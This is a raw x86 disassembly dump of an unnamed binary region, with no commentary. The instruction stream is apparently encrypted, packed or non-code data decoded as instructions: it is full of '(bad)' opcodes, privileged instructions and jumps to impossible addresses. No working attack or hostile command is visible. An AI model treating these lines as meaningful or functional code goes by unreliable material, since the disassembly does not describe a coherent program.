  40ce1f:	and    eax,0xa42c8d1
  40ce24:	leave  
  40ce25:	dec    esi
  40ce26:	loope  0x40ce43
  40ce28:	std    
  40ce29:	leave  
  40ce2a:	lds    esp,FWORD PTR [esp]
  40ce2d:	jl     0x40cded
  40ce2f:	scas   al,BYTE PTR es:[edi]
  40ce30:	cmp    DWORD PTR [ebx-0x3756da91],esi
  40ce36:	inc    edx
  40ce37:	or     BYTE PTR [ecx-0x16e40eb2],ah
  40ce3d:	leave  
  40ce3e:	popf   
  40ce3f:	and    al,0x26
  40ce41:	(bad)  
  40ce42:	xor    eax,0xd3c989c3
  40ce47:	inc    eax
  40ce48:	neg    BYTE PTR [ecx]
  40ce4a:	jmp    0x9193c173
  40ce4f:	repnz add BYTE PTR [eax],al
	...
  40ce7a:	jb     0x40ce44
  40ce7c:	push   DWORD PTR [ebp-0x3b]
  40ce7f:	mov    WORD PTR [eax+ebp*1+0x3a],ds
  40ce83:	xor    eax,DWORD PTR [edx]
  40ce85:	jmp    0xd53fa9c7
  40ce8a:	push   ebp
  40ce8b:	rcr    BYTE PTR [esi],0x54
  40ce8e:	and    cl,al
  40ce90:	(bad)  
  40ce91:	aam    0x19
  40ce93:	enter  0xf174,0x55
  40ce97:	mov    ebx,DWORD PTR [esi+edi*1+0x205e285a]
  40ce9e:	jg     0x40ceff
  40cea0:	add    BYTE PTR [esi+eiz*4+0x6d2d80b7],dl
  40cea7:	sar    dh,1
  40cea9:	push   ds
  40ceaa:	mov    BYTE PTR [esi],bl
  40ceac:	cld    
  40cead:	mov    ecx,0xe104e62
  40ceb2:	rcl    BYTE PTR [ebx-0x18],1
  40ceb5:	das    
  40ceb6:	ja     0x40cf13
  40ceb8:	add    dl,dh
  40ceba:	jge    0x40cf14
  40cebc:	test   DWORD PTR [ebx+0x26005b3f],ebp
  40cec2:	mov    al,ds:0x3de8ffcf
  40cec7:	pop    ebx
  40cec8:	(bad)  
  40cec9:	and    al,0x36
  40cecb:	enter  0xe906,0x3d
  40cecf:	xor    eax,0x353a4300
  40ced4:	add    BYTE PTR [ebx+0x42],dl
  40ced7:	(bad)  
  40ced8:	inc    esp
  40ced9:	mov    ch,0xea
  40cedb:	(bad)  
  40cedc:	test   BYTE PTR [ebp+0x0],bh
	...
  40cf06:	add    BYTE PTR [eax],al
  40cf08:	inc    ebp
  40cf09:	enter  0x19fe,0x5d
  40cf0d:	dec    esi
  40cf0e:	clc    
  40cf0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf10:	mov    bh,0xc3
  40cf12:	out    0x81,eax
  40cf14:	rcr    BYTE PTR [edx+0x0],0xe2
  40cf18:	std    
  40cf19:	dec    esi
  40cf1a:	add    eax,0x5d3780
  40cf1f:	add    BYTE PTR [edi-0xd],ah
  40cf22:	popf   
  40cf23:	dec    eax
  40cf24:	es pop edi
  40cf26:	push   DWORD PTR [ebp-0x79]
  40cf29:	jae    0x40cf14
  40cf2b:	mov    eax,ds:0x8b507bd0
  40cf30:	pop    ss
  40cf31:	jmp    0x50ff:0x7be8f484
  40cf38:	test   DWORD PTR [ebx-0x27],esi
  40cf3b:	mov    eax,ds:0x85897bf0
  40cf40:	ja     0x40cfa4
  40cf42:	(bad)  
  40cf43:	dec    DWORD PTR [edi+0x70ff9cca]
  40cf49:	cmc    
  40cf4a:	(bad)  
  40cf4b:	addr16 int 0x6
  40cf4e:	inc    eax
  40cf4f:	add    BYTE PTR [eax+0x24],ah
  40cf52:	lock div DWORD PTR [eax]
  40cf55:	jp     0x40cf56
  40cf57:	jne    0x40cf7c
  40cf59:	jae    0x40cf8d
  40cf5b:	mov    eax,ds:0x85897a30
  40cf60:	dec    ebx
  40cf61:	(bad)  
  40cf62:	(bad)  
  40cf63:	dec    ebp
  40cf65:	pop    edx
  40cf66:	push   0xfe9fd363
  40cf6b:	inc    BYTE PTR [eax]
	...
  40cf95:	add    BYTE PTR [edx],ch
  40cf97:	outs   dx,DWORD PTR ds:[esi]
  40cf98:	idiv   edi
  40cf9a:	loopne 0x40d015
  40cf9c:	jne    0x40cfaa
  40cf9e:	out    dx,eax
  40cf9f:	rcr    DWORD PTR [edi-0x7b280f01],0xec
  40cfa6:	call   0xa7abcf24
  40cfab:	repnz push 0x5c
  40cfae:	pop    di
  40cfb0:	push   DWORD PTR [ebp-0x9e19]
  40cfb6:	shl    bl,1
  40cfb8:	or     ch,al
  40cfba:	jecxz  0x40cff6
  40cfbc:	(bad)  
  40cfbd:	dec    DWORD PTR [esi]
  40cfbf:	shl    edi,cl
  40cfc1:	idiv   DWORD PTR [esi]
  40cfc3:	in     eax,dx
  40cfc4:	and    DWORD PTR [edx+0x3e],ebp
  40cfc7:	pop    esp
  40cfc8:	cdq    
  40cfc9:	pop    ebx
  40cfca:	push   DWORD PTR [ebx+0x4d6eb521]
  40cfd0:	and    bh,bh
  40cfd2:	imul   eax,edi,0x145fe80e
  40cfd8:	and    bh,bh
  40cfda:	(bad)  
  40cfdb:	aaa    
  40cfdc:	aas    
  40cfdd:	not    DWORD PTR [ecx+0x25]
  40cfe0:	nop
  40cfe1:	test   DWORD PTR [esi+0x25],ebx
  40cfe4:	and    bh,bh
  40cfe6:	out    dx,al
  40cfe7:	fwait
  40cfe8:	xchg   DWORD PTR [edi+edi*2-0x4c],ebx
  40cfec:	and    DWORD PTR [ebp-0xdd72d2],esi
  40cff2:	sub    edi,eax
  40cff4:	inc    ebp
  40cff5:	dec    eax
  40cff6:	jg     0x40cfac
  40cff8:	sub    bh,BYTE PTR [esi+0x0]
	...
  40d022:	add    BYTE PTR [eax],al
  40d024:	fidivr WORD PTR [edx+eiz*1+0xb]
  40d028:	(bad)  
  40d029:	out    dx,eax
  40d02a:	sti    
  40d02b:	or     bl,0x53
  40d02e:	sbb    bh,bh
  40d030:	add    eax,eax
  40d032:	xchg   edi,eax
  40d033:	psubw  mm0,QWORD PTR [ebx]
  40d036:	xchg   edx,eax
  40d037:	test   DWORD PTR [esi],edx
  40d039:	int    0x20
  40d03b:	dec    DWORD PTR [esi-0x1e6271a4]
  40d041:	mov    ah,0x2c
  40d043:	adc    al,0x45
  40d045:	hlt    
  40d046:	xchg   edi,eax
  40d047:	add    eax,0x9ca0ac6e
  40d04c:	leave  
  40d04d:	lods   al,BYTE PTR ds:[esi]
  40d04e:	dec    eax
  40d04f:	test   esi,esp
  40d051:	lods   al,BYTE PTR ds:[esi]
  40d052:	and    bh,bh
  40d054:	push   ebx
  40d055:	mov    ah,0x2
  40d057:	add    bl,al
  40d059:	ds xor al,0xf7
  40d05c:	test   eax,0xce67b40c
  40d061:	push   edi
  40d062:	ret    
  40d063:	call   FWORD PTR [eax-0x76eba3a6]
  40d069:	lds    ebx,FWORD PTR [ebp-0x7ea8ecdf]
  40d06f:	xchg   ebp,eax
  40d070:	mov    eax,ds:0xc38b8dc5
  40d075:	scas   al,BYTE PTR es:[edi]
  40d076:	jge    0x40d099
  40d078:	jno    0x40d053
  40d07a:	cmp    ebp,DWORD PTR [eax]
  40d07c:	jno    0x40d043
  40d07e:	jne    0x40d084
  40d080:	xor    edi,ebx
  40d082:	push   ecx
  40d083:	add    al,0x3e
  40d085:	pop    ebx
  40d086:	push   0x5f
	...
  40d0b0:	add    BYTE PTR [eax],al
  40d0b2:	(bad)  
  40d0b3:	int    0x5d
  40d0b5:	and    DWORD PTR [esi],edi
  40d0b7:	push   esi
  40d0b8:	ins    DWORD PTR es:[edi],dx
  40d0b9:	xchg   edx,eax
  40d0ba:	ds pop ebx
  40d0bc:	jmp    0x3df4cc45
  40d0c1:	and    DWORD PTR [ecx],esi
  40d0c3:	pop    esp
  40d0c4:	out    dx,al
  40d0c5:	xchg   DWORD PTR [edi-0x69fc16a5],edi
  40d0cb:	imul   ebp,ecx,0x30
  40d0ce:	fadd   st,st(4)
  40d0d0:	fwait
  40d0d1:	or     esp,DWORD PTR [esi]
  40d0d3:	stos   BYTE PTR es:[edi],al
  40d0d4:	jg     0x40d0f7
  40d0d6:	or     ebp,eax
  40d0d8:	pop    ebx
  40d0d9:	xor    BYTE PTR [ecx],cl
  40d0db:	lds    ecx,FWORD PTR ds:0x11537321
  40d0e1:	jmp    0xb3b3:0x20fdc4d7
  40d0e8:	std    
  40d0e9:	and    cl,ah
  40d0eb:	les    esi,FWORD PTR [ebx+0xb]
  40d0ee:	out    0x63,al
  40d0f0:	and    DWORD PTR [eax],0xffffffd1
  40d0f3:	les    edx,FWORD PTR [ebx-0x2a3b2ed9]
  40d0f9:	and    BYTE PTR [ebx+0x53],cl
  40d0fc:	ror    DWORD PTR ds:0x20c5c4d4,0xeb
  40d103:	mov    ds:0xc4a920b5,eax
  40d108:	(bad)  
  40d109:	cmp    esi,DWORD PTR [edx]
  40d10b:	mov    bl,0x99
  40d10d:	push   eax
  40d10e:	pop    esi
  40d10f:	(bad)  
  40d110:	(bad)  
  40d111:	pop    esp
  40d112:	push   ecx
  40d113:	int3   
  40d114:	(bad)  
  40d115:	sahf   
	...
  40d13e:	add    BYTE PTR [eax],al
  40d140:	pop    esi
  40d141:	dec    esi
  40d142:	or     BYTE PTR [ecx-0x71011db1],al
  40d148:	ret    0xd406
  40d14b:	jle    0x40d16b
  40d14d:	(bad)  
  40d14e:	push   esp
  40d150:	push   0xffffffd9
  40d152:	mov    esp,0xfec44699
  40d157:	in     eax,0xb0
  40d159:	push   0xffffff8b
  40d15b:	ins    BYTE PTR es:[edi],dx
  40d15c:	or     esp,ecx
  40d15e:	(bad)  
  40d15f:	pop    esi
  40d160:	push   ds
  40d161:	mov    edi,edi
  40d163:	fdiv   QWORD PTR ds:0x5e7069b3
  40d169:	(bad)  
  40d16a:	jmp    0x35b4:0xfdc3e3f3
  40d171:	mov    bl,0x5d
  40d173:	push   eax
  40d174:	pop    esi
  40d175:	(bad)  
  40d176:	(bad)  
  40d177:	je     0x40d1da
  40d179:	int3   
  40d17a:	(bad)  
  40d17b:	es gs stc 
  40d17e:	fwait
  40d17f:	push   ds
  40d180:	pop    esi
  40d181:	les    esi,FWORD PTR [ebp+eax*1+0x1fec426]
  40d188:	jbe    0x40d171
  40d18a:	inc    BYTE PTR [esi]
  40d18c:	push   ds
  40d18d:	push   cs
  40d18e:	call   0xe8051b89
  40d193:	gs popa 
  40d195:	(bad)  
  40d196:	(bad)  
  40d197:	out    dx,al
  40d198:	jae    0x40d141
  40d19a:	mul    dh
  40d19c:	xor    DWORD PTR [ebx-0x3bd68280],esi
  40d1a2:	(bad)  
  40d1a3:	pushf  
	...
  40d1cc:	add    BYTE PTR [eax],al
  40d1ce:	push   es
  40d1cf:	int3   
  40d1d0:	dec    dh
  40d1d2:	push   0x4d
  40d1d4:	pushf  
  40d1d5:	add    BYTE PTR [eax+0x63],bh
  40d1d8:	push   DWORD PTR [ebp-0x9419]
  40d1de:	call   0x533fdcc4
  40d1e3:	push   edi
  40d1e4:	call   0xffa4aca2
  40d1e9:	push   edx
  40d1eb:	outs   dx,BYTE PTR ds:[esi]
  40d1ec:	idiv   edi
  40d1ee:	test   al,0x76
  40d1f0:	pop    edx
  40d1f1:	pushf  
  40d1f2:	enter  0xff63,0x45
  40d1f6:	mov    edi,0xe8fdcd75
  40d1fb:	arpl   di,di
  40d1fd:	jne    0x40d1ea
  40d1ff:	jbe    0x40d277
  40d201:	mov    BYTE PTR [edi+0x57],ah
  40d204:	leave  
  40d205:	ret    0x574b
  40d208:	push   ebp
  40d209:	mov    edi,ebx
  40d20b:	xlat   BYTE PTR ds:[ebx]
  40d20c:	ret    
  40d20d:	cld    
  40d20e:	jge    0x40d267
  40d210:	push   0x1c
  40d212:	mov    ah,ah
  40d214:	push   es
  40d215:	call   0x401225
  40d21a:	scas   al,BYTE PTR es:[edi]
  40d21b:	xchg   esp,eax
  40d21c:	cli    
  40d21d:	push   0x3f9b8c
  40d222:	push   0xe648c1a4
  40d227:	pop    esi
  40d228:	push   DWORD PTR [ebp+0xf]
  40d22b:	ja     0x40d29f
  40d22d:	std    
  40d22e:	sub    BYTE PTR [edx+0x68],ah
  40d231:	fwait
	...
  40d25a:	add    BYTE PTR [eax],al
  40d25c:	stos   DWORD PTR es:[edi],eax
  40d25d:	xchg   edi,eax
  40d25e:	(bad)  
  40d25f:	addr16 in eax,0x5e
  40d262:	add    BYTE PTR [eax-0x17f91c18],al
  40d268:	mov    bh,0x7b
  40d26a:	(bad)  
  40d26b:	(bad)  
  40d26c:	call   0x7340cd54
  40d271:	dec    edi
  40d272:	call   0xffa290f6
  40d277:	leave  
  40d278:	test   BYTE PTR ds:[esi],0x0
  40d27c:	adc    edi,DWORD PTR ds:0x7a812f
  40d282:	sbb    eax,0x42ea9ff
  40d287:	push   0x43
  40d289:	or     DWORD PTR [eax+0x7d54a607],ebx
  40d28f:	call   DWORD PTR [ecx+0x16fbc84b]
  40d295:	mov    eax,0x373e0003
  40d29a:	mov    bh,dh
  40d29c:	js     0x40d26f
  40d29e:	sbb    eax,0x85c26650
  40d2a3:	add    BYTE PTR [esi],bh
  40d2a5:	int    0x42
  40d2a7:	je     0x40d2bb
  40d2a9:	pop    es
  40d2aa:	pop    es
  40d2ab:	add    DWORD PTR [esi],edi
  40d2ad:	mov    ah,0x95
  40d2af:	and    al,0xe6
  40d2b1:	in     al,0xbe
  40d2b3:	inc    eax
  40d2b4:	ds das 
  40d2b6:	mov    bh,dh
  40d2b8:	inc    eax
  40d2b9:	sub    DWORD PTR [esi],ebx
  40d2bb:	push   eax
  40d2bc:	or     DWORD PTR es:[esi-0x1],edi
	...
  40d2e8:	add    BYTE PTR [eax],al
  40d2ea:	xor    esp,esp
  40d2ec:	stos   BYTE PTR es:[edi],al
  40d2ed:	jmp    FWORD PTR [ecx]
  40d2ef:	adc    DWORD PTR [ebp+0x50],ebx
  40d2f2:	and    edi,edi
  40d2f4:	or     ch,al
  40d2f6:	shl    BYTE PTR [edx+0x1e],1
  40d2f9:	jmp    DWORD PTR [esi]
  40d2fb:	adc    BYTE PTR [edx-0x1],bh
  40d2fe:	or     DWORD PTR [ecx-0x68],esp
  40d301:	sti    
  40d302:	add    edi,ebx
  40d304:	or     ch,al
  40d306:	push   ecx
  40d307:	dec    ebx
  40d308:	push   ds
  40d309:	inc    DWORD PTR [edi]
  40d30b:	jbe    0x40d314
  40d30d:	add    BYTE PTR [ebx-0x57cd0b3],dl
  40d313:	(bad)  
  40d314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d315:	jmp    DWORD PTR [edi-0x6e]
  40d318:	sbb    eax,0xd15b4675
  40d31d:	pop    ecx
  40d31e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d31f:	rcr    ebp,0x8b
  40d322:	jnp    0x40d2e3
  40d324:	inc    eax
  40d325:	add    al,0x3e
  40d327:	mov    dl,0x8e
  40d329:	lods   al,BYTE PTR ds:[esi]
  40d32a:	jle    0x40d34a
  40d32c:	sub    BYTE PTR [esi+edx*1],al
  40d32f:	nop
  40d330:	sbb    al,0xc3
  40d332:	mov    eax,ds:0xa60c3bc0
  40d337:	clc    
  40d338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d339:	sbb    eax,0x201bc191
  40d33e:	mov    DWORD PTR [edi-0xf],eax
  40d341:	sub    esp,DWORD PTR [edx-0x1e]
  40d344:	xchg   ebp,eax
  40d345:	sbb    eax,0x3e49c87
  40d34a:	or     edx,esi
  40d34c:	xchg   esp,eax
  40d34d:	add    DWORD PTR [eax],0x0
	...
  40d378:	and    BYTE PTR [esi-0x309ee28b],0x2b
  40d37f:	and    dh,ch
  40d381:	shl    ebx,0xf3
  40d384:	push   eax
  40d385:	inc    edi
  40d386:	cmc    
  40d387:	sub    edx,edx
  40d389:	fld1   
  40d38b:	add    esi,DWORD PTR ds:0x3286e59b
  40d391:	pop    ebx
  40d392:	jmp    0x4157cc9a
  40d397:	add    al,0x3e
  40d399:	pop    ebx
  40d39a:	jmp    0x36084ee3
  40d39f:	add    eax,0x3c35b3e
  40d3a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3a5:	pop    ebx
  40d3a6:	xchg   ebx,eax
  40d3a7:	add    edx,DWORD PTR [ebx+ebx*2+0x2c0dc76c]
  40d3ae:	fs xchg edx,esi
  40d3b1:	enter  0x1d0d,0x8e
  40d3b5:	sar    BYTE PTR [ebx+0x1b],0xe9
  40d3b9:	inc    esi
  40d3ba:	std    
  40d3bb:	sub    edi,DWORD PTR [eax-0x28]
  40d3be:	(bad)  
  40d3bf:	call   0x76012801
  40d3c4:	cmp    BYTE PTR [edx+0x5b3de8b6],dh
  40d3ca:	push   0x1bf57e
  40d3cf:	(bad)  
  40d3d0:	rcl    BYTE PTR [eax-0x18],1
  40d3d3:	jbe    0x40d408
  40d3d5:	sar    dh,0x19
  40d3d8:	mov    bh,0xab
  40d3da:	mov    WORD PTR [eax+eax*1+0x0],fs
	...
  40d406:	dec    ecx
  40d407:	enter  0xb6fe,0xcd
  40d40b:	sub    ch,al
  40d40d:	adc    ax,ax
  40d410:	(bad)  
  40d411:	jo     0x40d3d3
  40d413:	retf   
  40d414:	neg    BYTE PTR [esi+0x73dcb322]
  40d41a:	pop    edx
  40d41b:	ror    BYTE PTR [esp+eiz*2-0x790137e3],0xad
  40d423:	cmp    bh,dl
  40d425:	sbb    eax,0x3cfdc07d
  40d42a:	sub    eax,0x326efec8
  40d42f:	inc    esi
  40d430:	or     al,0x51
  40d432:	push   es
  40d433:	fdivp  st(6),st
  40d435:	pop    esi
  40d436:	mov    ah,0xd6
  40d438:	jecxz  0x40d498
  40d43a:	pop    edx
  40d43b:	shr    BYTE PTR [ecx-0x17],0xe5
  40d43f:	lahf   
  40d440:	pop    ebx
  40d441:	test   al,0x3d
  40d443:	shl    BYTE PTR [ecx+edi*1+0x36fec04a],0xb0
  40d44b:	push   ebx
  40d44c:	call   0xff01647a
  40d451:	jo     0x40d413
  40d453:	scas   al,BYTE PTR es:[edi]
  40d454:	neg    BYTE PTR [esi]
  40d456:	and    dh,BYTE PTR ds:0x1f218100
  40d45c:	inc    ecx
  40d45d:	jmp    0x130dab4
  40d462:	call   0x6b40d3ca
  40d467:	push   eax
  40d468:	call   0x40d512
	...
  40d491:	add    BYTE PTR [eax],al
  40d493:	add    BYTE PTR [edx+0x5f],dh
  40d496:	dec    DWORD PTR [ecx-0x88ba6]
  40d49c:	loopne 0x40d48e
  40d49e:	(bad)  
  40d49f:	repnz add al,BYTE PTR [bx+si+0x0]
  40d4a4:	nop
  40d4a5:	sub    eax,esi
  40d4a7:	test   DWORD PTR [eax-0x4c8a009d],0xe09d8a73
  40d4b1:	arpl   WORD PTR [ecx-0x944c7b],cx
  40d4b7:	(bad)  
  40d4b8:	std    
  40d4b9:	push   esi
  40d4ba:	push   0xfe9603fb
  40d4bf:	(bad)  
  40d4c0:	jmp    0x7563:0xd0fff766
  40d4c7:	or     al,0xbf
  40d4c9:	repz fwait
  40d4cb:	inc    eax
  40d4cd:	int    0x84
  40d4cf:	fsubr  st,st(0)
  40d4d1:	arpl   di,di
  40d4d3:	push   0x67
  40d4d5:	repz xor eax,0xff57265d
  40d4db:	mov    ch,0xe7
  40d4dd:	imul   edi,edi,0xffffffff
  40d4e0:	loopne 0x40d4cb
  40d4e2:	or     ch,al
  40d4e4:	sti    
  40d4e5:	inc    ebx
  40d4e6:	(bad)  
  40d4e7:	call   FWORD PTR [esi-0x7f082c24]
  40d4ed:	bound  eax,QWORD PTR [ebx-0x958443]
  40d4f3:	jmp    DWORD PTR [edi]
  40d4f5:	iret   
  40d4f6:	ja     0x40d47b
	...
  40d520:	add    BYTE PTR [eax],al
  40d522:	mov    ds:0x60fff773,al
  40d527:	push   edi
  40d528:	je     0x40d59a
  40d52a:	xchg   esp,eax
  40d52b:	and    al,0xe8
  40d52d:	idiv   DWORD PTR [esi]
  40d52f:	sbb    eax,DWORD PTR gs:[eax]
  40d532:	push   0xffffffd5
  40d534:	stos   BYTE PTR es:[edi],al
  40d535:	(bad)  
  40d537:	gs pop edx
  40d539:	jmp    FWORD PTR [ebx-0x34]
  40d53c:	sub    bh,BYTE PTR [edi-0xe63a50]
  40d542:	mov    eax,eax
  40d544:	adc    edi,edi
  40d546:	leave  
  40d547:	mov    ch,0x8f
  40d549:	pop    es
  40d54a:	(bad)  
  40d54b:	shl    DWORD PTR [ecx-0x1],0xb9
  40d54f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d550:	dec    edi
  40d551:	call   0xff5a62ff
  40d556:	xor    ecx,esp
  40d558:	sub    al,BYTE PTR ds:0xff19fdc9
  40d55e:	rcl    DWORD PTR [ecx+edx*1+0x4fed91ff],cl
  40d565:	in     al,0x91
  40d567:	cmc    
  40d568:	sbb    edi,edi
  40d56a:	or     ecx,esp
  40d56c:	sub    al,ch
  40d56e:	shl    ch,1
  40d570:	sbb    edi,edi
  40d572:	stos   DWORD PTR es:[edi],eax
  40d573:	or     al,0x12
  40d575:	jmp    FWORD PTR [ecx-0x2b]
  40d578:	pop    DWORD PTR [edi]
  40d57a:	push   esi
  40d57b:	shl    DWORD PTR [eax-0x1],1
  40d57e:	pop    ecx
  40d57f:	inc    ebp
  40d580:	push   eax
  40d581:	fmul   QWORD PTR [ecx+0x2d]
  40d584:	sbb    bh,bh
	...
  40d5ae:	add    BYTE PTR [eax],al
  40d5b0:	ror    ebx,cl
  40d5b2:	sub    dl,ch
  40d5b4:	test   al,0x1d
  40d5b6:	sbb    bh,bh
  40d5b8:	repz jg 0x40d5cd
  40d5bb:	push   DWORD PTR [ecx]
  40d5bd:	or     eax,0x6d160790
  40d5c2:	jno    0x40d5c3
  40d5c4:	and    DWORD PTR [ebp+0x50],edi
  40d5c7:	in     al,0x11
  40d5c9:	test   DWORD PTR [edx],ebx
  40d5cb:	call   0xff5b00b7
  40d5d0:	or     DWORD PTR [ebx+0x5c],ebx
  40d5d3:	daa    
  40d5d4:	or     DWORD PTR [esi-0x1c27d4e3],edi
  40d5da:	adc    eax,0x107f11a
  40d5df:	adc    ch,cl
  40d5e1:	mov    ebp,0xbdc77610
  40d5e6:	std    
  40d5e7:	sbb    DWORD PTR [ebx-0x2ee60262],edx
  40d5ed:	mov    dl,0x60
  40d5ef:	jl     0x40d5ba
  40d5f1:	mov    ebp,0xc5e64fe5
  40d5f6:	fstp   QWORD PTR [ecx]
  40d5f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5f9:	aas    
  40d5fa:	jo     0x40d615
  40d5fc:	mov    cl,0xbd
  40d5fe:	xchg   ebx,eax
  40d5ff:	xor    BYTE PTR [ecx+0x2c2cc5bd],dh
  40d605:	in     al,0xbd
  40d607:	sbb    DWORD PTR [ecx-0x6eee46f9],ebx
  40d60d:	mov    ebp,0xbe358fad
  40d612:	sbb    ecx,DWORD PTR [eax+eax*1]
	...
  40d63d:	add    BYTE PTR [esi+0x79199f55],dl
  40d643:	mov    ebp,0xbd69145b
  40d648:	lea    ebp,[eax+edx*1]
  40d64b:	in     al,0x85
  40d64d:	sbb    DWORD PTR [ecx+0x17],esp
  40d650:	sub    DWORD PTR [ebx],0x1975bd35
  40d656:	push   ecx
  40d657:	inc    edi
  40d658:	ins    DWORD PTR es:[edi],dx
  40d659:	sub    al,0xcc
  40d65b:	xlat   BYTE PTR ds:[ebx]
  40d65c:	call   0xecd94d64
  40d661:	add    edx,DWORD PTR [ebx-0x57abb30]
  40d667:	mov    edi,0x5c9403c2
  40d66c:	inc    esi
  40d66d:	(bad)  
  40d66e:	cmp    DWORD PTR [ebx-0x42e68e30],esi
  40d674:	call   FWORD PTR [edi-0x2f]
  40d677:	shl    BYTE PTR [edi-0x17],0xd0
  40d67b:	sbb    eax,DWORD PTR [eax]
  40d67d:	es icebp 
  40d67f:	cdq    
  40d680:	inc    edi
  40d681:	test   al,0x3d
  40d683:	mov    esp,0x9b25e174
  40d688:	cld    
  40d689:	push   cs
  40d68a:	inc    edi
  40d68b:	xor    eax,DWORD PTR [eax]
  40d68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d68e:	cld    
  40d68f:	mov    esp,0x5b3deb66
  40d694:	xor    dh,0xc0
  40d697:	push   esp
  40d698:	call   0xfefd07dc
  40d69d:	out    0xb0,al
  40d69f:	sar    dh,0x54
	...
  40d6ca:	add    BYTE PTR [eax],al
  40d6cc:	dec    edx
  40d6cd:	mov    bl,0x7a
  40d6cf:	jg     0x40d727
  40d6d1:	mov    esp,0xbca9abc8
  40d6d6:	push   ebx
  40d6d7:	jb     0x40d732
  40d6d9:	fadd   st,st(3)
  40d6db:	mov    ebp,0xe96a25cf
  40d6e0:	jecxz  0x40d73e
  40d6e2:	push   DWORD PTR [edx+edi*1]
  40d6e5:	mov    bl,0x1c
  40d6e7:	jg     0x40d70f
  40d6e9:	mov    esp,0xd0562488
  40d6ee:	xor    al,0x2e
  40d6f0:	sbb    BYTE PTR [ebx],0x0
  40d6f3:	bound  edx,QWORD PTR [eax+0x3a284811]
  40d6f9:	fstp   TBYTE PTR [esi]
  40d6fb:	jmp    0x27a912c9
  40d700:	mov    DWORD PTR [ebx],ebx
  40d702:	add    BYTE PTR [edi],dl
  40d704:	sbb    al,BYTE PTR [ecx+0x2b3de985]
  40d70a:	push   0x1af0ab
  40d70f:	mov    esi,0xe9856d65
  40d714:	cmp    eax,0x57000b21
  40d719:	int    0x2
  40d71b:	or     esi,DWORD PTR ds:0x7f5628cc
  40d721:	in     eax,0xa0
  40d723:	call   FWORD PTR [eax-0x10]
  40d726:	pop    eax
  40d727:	pop    ebp
  40d728:	(bad)  
  40d729:	push   edi
  40d72a:	push   eax
  40d72b:	call   0x401ba4
	...
  40d758:	add    BYTE PTR [eax],al
  40d75a:	mov    bh,0xef
  40d75c:	(bad)  
  40d75d:	(bad)  
  40d75e:	call   0x9a963f85
  40d763:	cwde   
  40d764:	dec    BYTE PTR [edi-0x28]
  40d767:	int    0x6
  40d769:	call   0x3ff0b7
  40d76e:	aas    
  40d76f:	fist   DWORD PTR [edi+0x16fd8ff]
  40d775:	inc    esi
  40d776:	daa    
  40d777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d778:	(bad)  
  40d779:	je     0x40d708
  40d77b:	cld    
  40d77c:	cli    
  40d77d:	xor    edx,edi
  40d77f:	sbb    eax,0x6378ffff
  40d784:	repnz scas al,BYTE PTR es:[edi]
  40d786:	aas    
  40d787:	mov    esp,0xe9c89f73
  40d78c:	cli    
  40d78d:	call   DWORD PTR [edx+0x4f]
  40d790:	call   0xffa4da78
  40d795:	pop    edi
  40d796:	cmp    DWORD PTR [esi],ecx
  40d798:	ret    0x6704
  40d79b:	or     cl,BYTE PTR [edx-0x3e52b14]
  40d7a1:	jmp    DWORD PTR [edx+0x53]
  40d7a4:	push   DWORD PTR [ebp+0x4f]
  40d7a7:	outs   dx,DWORD PTR ds:[esi]
  40d7a8:	cli    
  40d7a9:	xchg   edx,eax
  40d7aa:	enter  0x8963,0x45
  40d7ae:	(bad)  [ebx+0x75]
  40d7b1:	cld    
  40d7b2:	fsubr  st,st(1)
  40d7b4:	push   es
  40d7b5:	call   0x4006b7
  40d7ba:	ds cmp eax,0xbc9
	...
  40d7e8:	xor    eax,0xbd419084
  40d7ed:	pop    ebx
  40d7ee:	add    al,0x74
  40d7f0:	pop    ebx
  40d7f1:	jns    0x40d784
  40d7f3:	sti    
  40d7f4:	es push es
  40d7f6:	jnp    0x40d7f7
  40d7f8:	or     ebp,edx
  40d7fa:	adc    eax,0x91813275
  40d7ff:	sti    
  40d800:	mov    ds,WORD PTR [ecx-0x6f]
  40d803:	pop    es
  40d804:	out    0x26,al
  40d806:	jb     0x40d807
  40d808:	jmp    0x328e61fb
  40d80d:	inc    ebp
  40d80e:	(bad)  
  40d810:	push   edx
  40d811:	scas   al,BYTE PTR es:[edi]
  40d812:	mov    al,0xe7
  40d814:	inc    ebx
  40d815:	or     al,0x17
  40d817:	call   DWORD PTR ds:0xbd142b84
  40d81d:	aas    
  40d81e:	hlt    
  40d81f:	jmp    FWORD PTR ds:0x4e4589ac
  40d825:	xchg   ecx,eax
  40d826:	(bad)  
  40d827:	sti    
  40d828:	mov    ecx,0x95c289c4
  40d82d:	(bad)  
  40d82e:	jmp    0x7475ff2
  40d833:	add    bl,ch
  40d835:	cmp    al,0x27
  40d837:	call   DWORD PTR [ebx]
  40d839:	cwde   
  40d83a:	adc    eax,0x85cc3675
  40d83f:	xchg   edx,eax
  40d840:	jns    0x40d81b
  40d842:	adc    eax,0x17744275
  40d847:	jne    0x40d87f
  40d849:	fdiv   st(5),st
  40d84b:	xchg   edx,eax
	...
  40d874:	add    BYTE PTR [eax],al
  40d876:	popa   
  40d877:	loope  0x40d8c4
  40d879:	ret    0xc446
  40d87c:	scas   eax,DWORD PTR es:[edi]
  40d87d:	mov    ah,BYTE PTR [edx+0x45]
  40d880:	aas    
  40d881:	shl    al,0x50
  40d884:	mov    bl,0x82
  40d886:	ret    
  40d887:	pop    edx
  40d888:	icebp  
  40d889:	add    esi,DWORD PTR [edx+0x45986a4d]
  40d88f:	pop    ebx
  40d890:	fld    QWORD PTR [edi]
  40d892:	mov    ebp,0xaa03f937
  40d897:	popa   
  40d898:	push   0xffffff98
  40d89a:	sub    eax,0x650cb45b
  40d89f:	fwait
  40d8a0:	xchg   ecx,eax
  40d8a1:	mov    dh,0x6b
  40d8a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8a4:	sub    dh,bl
  40d8a6:	add    ebp,esp
  40d8a8:	stos   DWORD PTR es:[edi],eax
  40d8a9:	pop    es
  40d8aa:	mov    ebp,0x7382e5ba
  40d8af:	addr16 jmp 0x29a71644
